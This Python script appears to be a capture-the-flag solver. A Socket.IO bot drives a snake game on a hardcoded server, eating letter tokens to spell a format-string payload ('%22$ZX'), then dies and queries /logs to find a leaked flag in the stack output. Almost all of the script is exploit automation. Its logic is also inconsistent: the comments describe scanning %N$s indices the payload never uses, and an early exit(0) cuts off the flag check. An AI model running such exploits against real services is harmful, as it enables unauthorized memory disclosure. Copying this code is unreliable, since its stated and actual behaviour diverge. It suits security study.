#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import math
import time
import requests
import socketio
from collections import deque

HOST = "http://178.128.120.209"
PORT = 3000

# Scan %N$s positions until we hit the stack slot that points to the flag buffer.
SCAN_START = 1
SCAN_END   = 40

# Server pops one char about every 500ms while boosting; add a small safety margin.
POP_INTERVAL_SEC       = 0.55
# Avoid eating wrong fruits when approaching target (soft repulsion radius)
AVOID_RADIUS           = 60.0   # px
# Keep for future uses. We do NOT use this for normal suicide flows.
SUICIDE_BOOST_SECONDS  = 2.0
# "Near wall" threshold
WALL_SAFE_DIST = 36.0   # ~2-3 snake segments
WALL_STRONG_PUSH = 160.0  # virtual push force away from wall during purge
WALL_NEAR_DIST = 20.0   # px
# Self-collision avoidance
SELF_AVOID_RADIUS = 32   # px: minimum distance to 'body shadow'
SELF_AVOID_PUSH = 180    # push force away from 'body shadow' when too close
SELF_LOOKAHEAD = 70.0    # px: collision prediction step ahead
SELF_HISTORY_LEN = 600   # number of recent head points to simulate body
# Print debug logs
VERBOSE = True

MAX_TURN_RAD = math.pi/10  # ~18° maximum turn per frame

class SnakeBot:
    def __init__(self, host, port):
        self.base = f"{host}:{port}"
        self.sio = socketio.Client(
            reconnection=True,
            reconnection_attempts=0,
            reconnection_delay=1,
            reconnection_delay_max=5
        )
        self.player_id = None
        self.world_w = 0
        self.world_h = 0

        self.snake = None
        self.foods = []

        # collect -> suicide
        self.mode = "collect"

        self.target_seq = []
        self.target_str = ""
        self.seq_index = 0
        self.current_scan_index = SCAN_START
        self.finished = False
        self.have_logged_this_life = False

        # timers/state
        self.force_boost_until = 0.0   # PURGE timer (pop wrong chars)
        self.last_angle = 0.0

        self.prev_eaten = []
        self.prev_counts = None
        self.head_history = deque(maxlen=SELF_HISTORY_LEN)

        # PURGE bookkeeping
        self.purge_goal_len = None
        
        # Connection state
        self.disconnected = False
        self.initial_check_done = False

        self._wire_events()

    # ── Socket.IO events ────────────────────────────────────────────────────────
    def _wire_events(self):
        @self.sio.event
        def connect():
            self.log("[+] Connected")
            # Add small delay before joining
            time.sleep(0.1)
            self.sio.emit("joinGame", {})

        @self.sio.on("gameJoined")
        def on_joined(data):
            if self.player_id != data["playerId"]:
                self.player_id = data["playerId"]
                self.world_w = data["worldWidth"]
                self.world_h = data["worldHeight"]
                self.log(f"[+] Joined as {self.player_id} | world=({self.world_w}x{self.world_h})")
                self.prepare_new_attempt()
            else:
                self.log("[*] Reconnected with same ID.")

        @self.sio.on("gameState")
        def on_state(gs):
            try:
                self.on_game_state(gs)
            except Exception as e:
                self.log(f"[!] Error in on_game_state: {e}")

        @self.sio.on("respawned")
        def on_respawned(data):
            self.log("[*] Respawned")
            if "snake" in data:
                self.snake = data["snake"]
            self.reset_life_state()

        @self.sio.event
        def disconnect():
            self.log("[!] Disconnected. Auto-reconnect will retry...")
            self.disconnected = True

        @self.sio.event
        def connect_error(err):
            self.log(f"[!] Connect error: {err}")
            self.disconnected = True

    # ── Helpers ────────────────────────────────────────────────────────────────
    def log(self, *a, **k):
        if VERBOSE:
            print(*a, **k)

    def now(self):
        return time.perf_counter()

    def set_input(self, angle=None, boost=False):
        if self.disconnected or not getattr(self.sio, 'connected', False):
            return
        if angle is None:
            angle = self.last_angle
        else:
            self.last_angle = angle
        try:
            self.sio.emit("playerInput", {"direction": angle, "isBoosting": boost})
        except Exception as e:
            self.log(f"[!] Error sending input: {e}")

    def debug_hold(self, eaten, counts):
        joined = ''.join(eaten) if eaten else ''
        cbjs = {k: counts.get(k, 0) for k in ('C', 'B', 'J', 'S')}
        self.log(f"[HOLD] len={len(eaten)} chars='{joined}' counts={cbjs} progress={self.seq_index}/{len(self.target_seq)}")

    def nearest_wall_distance_and_normal(self, sx, sy):
        # return distance and normal (direction away from nearest wall)
        left_d, right_d, top_d, bottom_d = sx, self.world_w - sx, sy, self.world_h - sy
        min_d = min(left_d, right_d, top_d, bottom_d)
        if min_d == left_d:
            # left wall, normal points +x
            return min_d, (1.0, 0.0)
        if min_d == right_d:
            # right wall, normal points -x
            return min_d, (-1.0, 0.0)
        if min_d == top_d:
            # top wall, normal points +y
            return min_d, (0.0, 1.0)
        # bottom wall, normal points -y
        return min_d, (0.0, -1.0)
    
    def clamp_turn(self, desired_angle):
        # limit turning speed to prevent erratic movement
        da = (desired_angle - self.last_angle + math.pi) % (2*math.pi) - math.pi
        if abs(da) <= MAX_TURN_RAD:
            return desired_angle
        return self.last_angle + (MAX_TURN_RAD if da > 0 else -MAX_TURN_RAD)

    def wall_guard_angle(self, angle, sx, sy):
        """
        If near wall and current angle is heading into wall, turn parallel to wall (±90°),
        choosing the side with fewer food items / more open space.
        """
        d, normal = self.nearest_wall_distance_and_normal(sx, sy)
        if d > WALL_SAFE_DIST:
            return angle  # safe distance
        
        # current movement vector
        vx, vy = math.cos(angle), math.sin(angle)
        # if heading toward wall (dot < 0 with outward normal)
        if vx * normal[0] + vy * normal[1] < 0:
            # two parallel directions: rotate ±90°
            a1 = angle + math.pi/2
            a2 = angle - math.pi/2
            
            # score by distance to nearest food after a small step
            def score(a):
                px = sx + math.cos(a) * 40.0
                py = sy + math.sin(a) * 40.0
                px = max(0.0, min(self.world_w, px))
                py = max(0.0, min(self.world_h, py))
                
                # food clearance
                min_food = float("inf")
                for f in self.foods:
                    dd = math.hypot(f["x"] - px, f["y"] - py)
                    if dd < min_food:
                        min_food = dd
                if min_food == float("inf"):
                    min_food = 200.0
                
                # wall clearance at new point
                w = min(px, py, self.world_w - px, self.world_h - py)
                return min_food + 0.5 * w
            
            return a1 if score(a1) > score(a2) else a2
        return angle
    
    def mix_away_from_food_and_wall(self, sx, sy):
        """
        For PURGE: get direction 'away from nearest food' + 'push away from wall'.
        """
        # away from nearest food
        nearest = self._nearest_food_any(sx, sy)
        ax, ay = 0.0, 0.0
        if nearest:
            fx, fy = sx - nearest["x"], sy - nearest["y"]
            fd = math.hypot(fx, fy) or 1.0
            ax += fx / fd
            ay += fy / fd
        
        # push away from wall
        d, n = self.nearest_wall_distance_and_normal(sx, sy)
        # if too close to wall, increase wall push weight
        w = WALL_STRONG_PUSH / max(d, 1.0)
        ax += n[0] * w
        ay += n[1] * w
        
        if ax == 0.0 and ay == 0.0:
            return self.last_angle
        return math.atan2(ay, ax)
    
    def nearest_self_point(self, x, y):
        """Return (minimum distance, push vector) to 'body shadow' (head history)."""
        best_d = float("inf")
        rx, ry = 0.0, 0.0
        for (px, py) in self.head_history:
            dx = x - px
            dy = y - py
            d = math.hypot(dx, dy)
            if d < best_d and d > 1e-6:
                best_d = d
                rx = dx / d
                ry = dy / d
        return best_d, (rx, ry)
    
    def self_avoid_vector(self, x, y):
        """Create push vector away from body if too close."""
        d, (nx, ny) = self.nearest_self_point(x, y)
        if d < SELF_AVOID_RADIUS:
            # push inversely proportional to distance
            strength = SELF_AVOID_PUSH / max(d, 1.0)
            return nx * strength, ny * strength
        return 0.0, 0.0

    def predict_self_collision(self, sx, sy, angle):
        """Predict one short step ahead for self-collision."""
        fx = sx + math.cos(angle) * SELF_LOOKAHEAD
        fy = sy + math.sin(angle) * SELF_LOOKAHEAD
        d, _ = self.nearest_self_point(fx, fy)
        return d < SELF_AVOID_RADIUS

    def self_guard_angle(self, angle, sx, sy):
        """
        If current direction predicts too close to body → turn slightly to more open side.
        """
        if not self.predict_self_collision(sx, sy, angle):
            return angle
        
        a1 = angle + math.pi/6   # +30°
        a2 = angle - math.pi/6   # -30°
        
        def score(a):
            fx = sx + math.cos(a) * SELF_LOOKAHEAD
            fy = sy + math.sin(a) * SELF_LOOKAHEAD
            d_self, _ = self.nearest_self_point(fx, fy)
            # also add wall distance to avoid edge hugging
            wall_d = min(fx, fy, self.world_w - fx, self.world_h - fy)
            return d_self + 0.4 * wall_d
        
        return a1 if score(a1) > score(a2) else a2

    @staticmethod
    def lcp_len(a, b):
        """Longest common prefix length"""
        m = min(len(a), len(b))
        i = 0
        while i < m and a[i] == b[i]:
            i += 1
        return i

    def prepare_new_attempt(self):
        """
        Build payload: pad "CBJS"*5 + %N$s to leak address + %23$A as marker.
        Using %23$A%X for better format string exploitation.
        """
        self.target_str = "CBJS" * 5 + "%22$ZX"
        self.target_seq = list(self.target_str)

        self.seq_index = 0
        self.mode = "collect"
        self.have_logged_this_life = False
        self.force_boost_until = 0.0
        self.prev_eaten = []
        self.prev_counts = None
        self.purge_goal_len = None
        self.initial_check_done = False

        self.log(f"[*] Attempt N={self.current_scan_index}, payload='{self.target_str}'")

    def reset_life_state(self):
        self.have_logged_this_life = False
        self.force_boost_until = 0.0
        self.prev_eaten = []
        self.prev_counts = None
        self.seq_index = 0
        self.purge_goal_len = None
        self.log("[*] Life state reset. Continue current attempt.")

    # --- /logs helpers ---
    def get_logs(self):
        """Fetch logs with improved error handling"""
        self.log(f"📜 Calling /logs for player_id: {self.player_id}")
        url = f"{self.base}/logs"
        try:
            r = requests.get(url, params={"socket_id": self.player_id}, timeout=10)
            if r.status_code != 200:
                self.log(f"⚠️ /logs error {r.status_code}: {r.text}")
                return None
            self.log("✅ /logs OK")
            data = r.json()
            ach = data.get('achievements', [])
            self.log("--- SERVER ACHIEVEMENTS ---")
            if ach:
                for a in ach:
                    self.log(f"   [{a.get('type')}] - {a.get('description')}")
            else:
                self.log("   (No achievements returned)")
            self.log("---------------------------")
            return data
        except requests.RequestException as e:
            self.log(f"🚨 /logs request error: {e}")
            return None

    def find_flag_in_data(self, log_data):
        """Enhanced flag detection with multiple patterns"""
        if not log_data or 'achievements' not in log_data:
            return None
        for a in log_data.get('achievements', []):
            d = a.get("description", "")
            # Check for common CTF flag formats
            for marker in ("DDC{", "flag{", "CTF{", "HTB{", "SEKAI{", "FLAG{"):
                if marker in d:
                    start = d.find(marker)
                    flag = d[start:]
                    if "}" in flag:
                        flag = flag[:flag.find("}")+1]
                    return flag
        return None

    def nearest_wall_distance(self, sx, sy):
        """Get distance and angle to nearest wall"""
        left_d   = sx
        right_d  = self.world_w - sx
        top_d    = sy
        bottom_d = self.world_h - sy
        min_d = min(left_d, right_d, top_d, bottom_d)
        if min_d == left_d:
            angle = math.pi
        elif min_d == right_d:
            angle = 0.0
        elif min_d == top_d:
            angle = -math.pi/2
        else:
            angle = math.pi/2
        return min_d, angle

    def find_clear_escape_angle(self, sx, sy, samples=16, step_px=50.0, look_food_radius=120.0):
        """
        Find a "clear" angle: as far from nearby food as possible, while not hugging walls.
        Score = min_dist_to_food_after_step + 0.5 * wall_distance_after_step
        """
        best_angle = self.last_angle
        best_score = -1e18
        for k in range(samples):
            ang = -math.pi + 2*math.pi * (k / samples)
            px = sx + math.cos(ang) * step_px
            py = sy + math.sin(ang) * step_px

            # clamp within map bounds
            px = max(0.0, min(self.world_w, px))
            py = max(0.0, min(self.world_h, py))

            # minimum distance to nearby food around the point after step
            min_food_d = float("inf")
            for f in self.foods:
                d = math.hypot(f["x"] - px, f["y"] - py)
                if d < min_food_d:
                    min_food_d = d
            if min_food_d == float("inf"):
                min_food_d = look_food_radius

            # distance to wall at point after step
            wall_d = min(px, py, self.world_w - px, self.world_h - py)

            score = min(min_food_d, look_food_radius) + 0.5 * wall_d
            if score > best_score:
                best_score = score
                best_angle = ang
        return best_angle

    # ── Game loop logic ─────────────────────────────────────────────────────────
    def on_game_state(self, data):
        snakes = data.get("snakes", [])
        foods = data.get("foods", [])
        self.foods = foods

        # Initial map validation - check if we have enough variety
        if not self.initial_check_done:
            chars = {f['char'] for f in self.foods}
            # Only require basic chars, others will spawn as we eat
            basic_required = {'C','B','J','S','$','2','3'}
            if len(chars) < 10 or not basic_required.issubset(chars):
                self.log(f"[!] Initial map too limited. Have: {chars}")
                self.log("[!] Rerolling map...")
                self.initial_check_done = True
                time.sleep(0.5)  # Brief delay before disconnect
                self.sio.disconnect()
                return
            else:
                self.log(f"[+] Initial map acceptable. Have: {chars}")
            self.initial_check_done = True

        if not snakes:
            return
        s = next((ss for ss in snakes if ss["id"] == self.player_id), None)
        if not s:
            return
        self.snake = s

        eaten = s.get("eatenCharacters", [])
        counts = s.get("letterCounts", {})
        is_alive = s.get("isAlive", True)
        sx, sy = s.get("x", 0), s.get("y", 0)

        self.head_history.append((sx, sy))

        eaten_str = ''.join(eaten)
        lcp = self.lcp_len(eaten_str, self.target_str)

        # detect just-ate
        just_ate = len(eaten) > len(self.prev_eaten)

        # debug on change
        if eaten != self.prev_eaten:
            self.debug_hold(eaten, counts)
            if lcp != self.seq_index:
                self.log(f"[*] Resync progress: {self.seq_index} -> {lcp}")
                self.seq_index = lcp
            self.prev_eaten = list(eaten)

        # ===== death handling (always check /logs) =====
        if not is_alive and not self.have_logged_this_life:
            self.have_logged_this_life = True

            success = (self.seq_index >= len(self.target_seq))
            if success:
                self.log("[*] Died after completing payload.")
            else:
                self.log("[!] Died unexpectedly.")
                self.log(f"--- Status: progress {self.seq_index}/{len(self.target_seq)} ---")

            # Small delay to ensure server processed death
            time.sleep(0.5)

            log_data = self.get_logs()
            if log_data:
                flag = self.find_flag_in_data(log_data)
                if flag:
                    print("\n" + "="*50)
                    print(f"[🎉 FLAG FOUND] {flag}")
                    print("="*50 + "\n")
                    self.finished = True
                    self.sio.disconnect()
                    return

            if success:
                # Move to next scan index
                self.current_scan_index += 1
                if self.current_scan_index > SCAN_END:
                    print("[×] Exhausted index range without finding flag. Stop.")
                    self.finished = True
                    self.sio.disconnect()
                    return
                self.log(f"[*] Next scan index N={self.current_scan_index} → respawn…")
                self.prepare_new_attempt()
            else:
                self.log("[*] Respawning to retry current attempt…")

            # Small delay before respawn
            time.sleep(0.5)
            self.sio.emit("respawn", {})
            return

        # ===== SPECIAL: at-wall & just ate wrong → steer to clear angle + BOOST to purge =====
        if len(eaten_str) > lcp and just_ate:
            min_wall_d, _ = self.nearest_wall_distance(sx, sy)
            if min_wall_d <= WALL_NEAR_DIST:
                pops_needed = len(eaten_str) - lcp
                # set purge goal to correct prefix
                self.purge_goal_len = lcp
                # boost time sufficient to pop all wrong chars
                self.force_boost_until = self.now() + pops_needed * POP_INTERVAL_SEC + 0.4
                # find clear angle & BOOST
                escape_ang = self.find_clear_escape_angle(sx, sy)
                escape_ang = self.wall_guard_angle(escape_ang, sx, sy)
                escape_ang = self.self_guard_angle(escape_ang, sx, sy)
                escape_ang = self.clamp_turn(escape_ang)
                self.log(f"[AT-WALL PURGE] just ate wrong near wall → pops={pops_needed}, steer to clear angle & BOOST")
                self.set_input(escape_ang, True)
                return

        # ----- Standard PURGE: pop any trailing mismatch beyond LCP -----
        if len(eaten_str) > lcp:
            pops_needed = len(eaten_str) - lcp
            if self.purge_goal_len is None or self.purge_goal_len > lcp:
                self.purge_goal_len = lcp
                self.force_boost_until = self.now() + pops_needed * POP_INTERVAL_SEC + 0.2
                self.log(f"[PURGE] need pop {pops_needed} → goal_len={self.purge_goal_len}")
            
            # steer away from food while purging to avoid re-eat
            angle = self.mix_away_from_food_and_wall(sx, sy)
            
            # if too close to wall and direction is still "into wall" then disable boost to avoid wall crash
            d, n = self.nearest_wall_distance_and_normal(sx, sy)
            toward_wall = math.cos(angle) * (-n[0]) + math.sin(angle) * (-n[1]) > 0.35

            still_purging = len(eaten) > self.purge_goal_len
            boost = ((self.now() < self.force_boost_until) or still_purging) and not (d < WALL_SAFE_DIST and toward_wall)
            
            # Add self-collision avoidance to purge movement
            px = sx + math.cos(angle) * 35.0
            py = sy + math.sin(angle) * 35.0
            sxv, syv = self.self_avoid_vector(px, py)
            if sxv != 0.0 or syv != 0.0:
                alpha = 0.75  # light mixing to not disrupt purge direction
                bx, by = math.cos(angle), math.sin(angle)
                mx = bx * (1.0 - alpha) + sxv * alpha
                my = by * (1.0 - alpha) + syv * alpha
                if abs(mx) > 1e-6 or abs(my) > 1e-6:
                    angle = math.atan2(my, mx)

            # final adjustment: avoid self-collision
            angle = self.self_guard_angle(angle, sx, sy)
            angle = self.clamp_turn(angle)
            self.set_input(angle, boost)
            return
        else:
            if self.purge_goal_len is not None:
                self.log("[PURGE] complete")
            self.purge_goal_len = None
            if self.seq_index != lcp:
                self.log(f"[*] Resync progress: {self.seq_index} -> {lcp}")
            self.seq_index = lcp  # exact prefix we currently hold

        # ----- State machine -----
        if self.mode == "collect":
            if self.seq_index >= len(self.target_seq):
                self.log("[*] Payload complete → switch to suicide.")
                self.mode = "suicide"
            else:
                self.seek_next_required(sx, sy)

        if self.mode == "suicide":
            self.log("[*] Suicide (no boost).")
            self.run_to_wall_and_die(sx, sy)
            exit(0)

    # ── Movement planners ───────────────────────────────────────────────────────
    def seek_next_required(self, sx, sy):
        needed = self.target_seq[self.seq_index]
        target = self._nearest_food_with_char(needed, sx, sy)

        if target:
            # Move toward needed with repulsion from wrong fruits
            dx = target["x"] - sx
            dy = target["y"] - sy
            vx, vy = dx, dy

            # Add repulsion from wrong foods
            for f in self.foods:
                if f["char"] == needed:
                    continue
                fx = f["x"] - sx
                fy = f["y"] - sy
                dist = math.hypot(fx, fy)
                if dist < 1e-6:
                    continue
                if dist < AVOID_RADIUS:
                    repulsion_strength = (AVOID_RADIUS - dist) / AVOID_RADIUS
                    rx = -fx / dist * repulsion_strength * 100
                    ry = -fy / dist * repulsion_strength * 100
                    vx += rx
                    vy += ry

            angle = math.atan2(vy, vx)
            angle = self.wall_guard_angle(angle, sx, sy)
            angle = self.self_guard_angle(angle, sx, sy)
            angle = self.clamp_turn(angle)
            self.set_input(angle, False)  # No boost during collection
            return

        # Target char not found, eat something to refresh spawns
        churn_food = None
        best_dist = float('inf')

        # Avoid eating any payload characters when churning
        avoid_chars = set(self.target_seq)
        for f in self.foods:
            if f['char'] not in avoid_chars:
                d = math.hypot(f['x'] - sx, f['y'] - sy)
                if d < best_dist:
                    best_dist = d
                    churn_food = f

        if churn_food is None:
            # prioritize fruit nearest to map center when none ideal
            cx, cy = self.world_w/2, self.world_h/2
            try:
                churn_food = min(self.foods, key=lambda f: (f['x']-cx)**2 + (f['y']-cy)**2)
            except ValueError:
                churn_food = None

        if churn_food is None:
            churn_food = self._nearest_food_any(sx, sy)

        if churn_food:
            angle = math.atan2(churn_food['y'] - sy, churn_food['x'] - sx)
            angle = self.wall_guard_angle(angle, sx, sy)
            angle = self.self_guard_angle(angle, sx, sy)
            angle = self.clamp_turn(angle)
            self.log(f"[CHURN] Char '{needed}' not found → eating '{churn_food['char']}' to refresh spawns")
            self.set_input(angle, False)
        else:
            safe_angle = self.wall_guard_angle(self.last_angle, sx, sy)
            safe_angle = self.self_guard_angle(safe_angle, sx, sy)
            safe_angle = self.clamp_turn(safe_angle)
            self.set_input(safe_angle, False)

    def run_to_wall_and_die(self, sx, sy):
        """Navigate to nearest wall for controlled death"""
        _, angle = self.nearest_wall_distance(sx, sy)
        angle = self.self_guard_angle(angle, sx, sy)
        angle = self.clamp_turn(angle)
        # normal suicide: NO boost to ensure controlled death
        self.set_input(angle, False)

    def _nearest_food_with_char(self, ch, sx, sy):
        """Find nearest food with specific character"""
        best = None
        best_dist = float("inf")
        for f in self.foods:
            if f["char"] == ch:
                d = math.hypot(f["x"] - sx, f["y"] - sy)
                if d < best_dist:
                    best_dist = d
                    best = f
        return best

    def _nearest_food_any(self, sx, sy):
        """Find nearest food of any type"""
        best = None
        best_dist = float("inf")
        for f in self.foods:
            d = math.hypot(f["x"] - sx, f["y"] - sy)
            if d < best_dist:
                best_dist = d
                best = f
        return best

    # ── Entry point with auto-reconnect ──────────────────────────────────────────
    def run(self):
        while not self.finished:
            self.disconnected = False
            try:
                self.sio.connect(self.base, transports=["websocket"], wait_timeout=10)
                self.sio.wait()
            except Exception as e:
                self.log(f"[!] Exception in run loop: {e}")
            if not self.finished:
                time.sleep(1)

if __name__ == "__main__":
    bot = SnakeBot(HOST, PORT)
    try:
        bot.run()
    except KeyboardInterrupt:
        pass